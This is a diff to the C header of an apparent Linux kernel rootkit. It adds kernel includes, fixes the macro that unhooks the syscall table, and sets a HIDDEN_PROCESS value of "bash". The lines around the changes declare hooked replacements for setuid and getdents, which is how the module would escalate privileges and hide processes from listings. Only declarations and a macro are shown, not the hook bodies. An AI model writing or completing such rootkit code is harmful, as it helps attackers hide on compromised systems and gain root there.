@@ -11,6 +11,10 @@
 #include <linux/namei.h>
 #include <linux/fs.h>
 #include <linux/utsname.h>
+#include <linux/file.h>
+#include <linux/fdtable.h>
+#include <linux/slab.h>
+#include <linux/proc_ns.h>
 
 struct linux_dirent {
     unsigned long   d_ino;
@@ -38,7 +42,7 @@ struct linux_dirent {
     sys_call_table[__NR_index] = (unsigned long*)&hacked_func
 
 #define UNHOOK_SYSCALL(sys_call_table, orig_func, __NR_index)               \
-    sys_call_table[__NR_index] = (unsigned long*)&orig_func
+    sys_call_table[__NR_index] = (unsigned long*)orig_func
 
 // Original system calls
 asmlinkage long (*orig_setuid)(uid_t uid);
@@ -47,3 +51,5 @@ asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirp, uns
 // Hacked system calls
 asmlinkage long hacked_setuid(uid_t uid);
 asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+
+char *HIDDEN_PROCESS = "bash";
